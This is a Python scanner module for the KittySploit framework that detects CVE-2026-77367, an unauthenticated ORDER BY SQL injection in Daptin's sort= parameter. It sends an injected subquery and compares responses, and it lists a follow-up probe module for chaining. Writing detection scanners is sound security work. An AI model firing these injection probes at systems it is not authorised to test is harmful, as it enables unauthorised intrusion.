#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-77367 — Daptin sort parameter SQLi."""

from kittysploit import *
from lib.protocols.http.daptin import Daptin
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client, Daptin):
    __info__ = {
        "name": "Daptin CVE-2026-77367 SQLi detect",
        "description": "Unauthenticated ORDER BY injection via sort= on /api/{entity}.",
        "author": ["LLCForge", "KittySploit Team"],
        "severity": "critical",
        "cve": ["CVE-2026-77367"],
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-77367"],
        "tags": ["daptin", "sqli", "unauth", "cve-2026-77367"],
        "agent": {
            "chain": {
                "suggested_followups": [
                    "auxiliary/admin/http/daptin_cve_2026_77367_sqli_probe",
                ],
            },
        },
    }

    entity = OptString("users", "Daptin entity name", required=False)

    def run(self):
        if not self.daptin_fingerprint():
            return False
        entity = str(self.entity or "users")
        code_err, body_err = self.daptin_entity_list(
            entity, "(SELECT 1 FROM nonexistent_tbl_llc)"
        )
        code_asc, body_asc = self.daptin_entity_list(entity, "id ASC")
        code_desc, body_desc = self.daptin_entity_list(entity, "id DESC")
        vuln = (
            code_err >= 500
            or "sql" in body_err.lower()
            or (code_asc == 200 and code_desc == 200 and body_asc != body_desc)
        )
        if not vuln:
            return False
        self.set_info(
            severity="critical",
            cve="CVE-2026-77367",
            reason=f"sort injection on /api/{entity}",
        )
        return True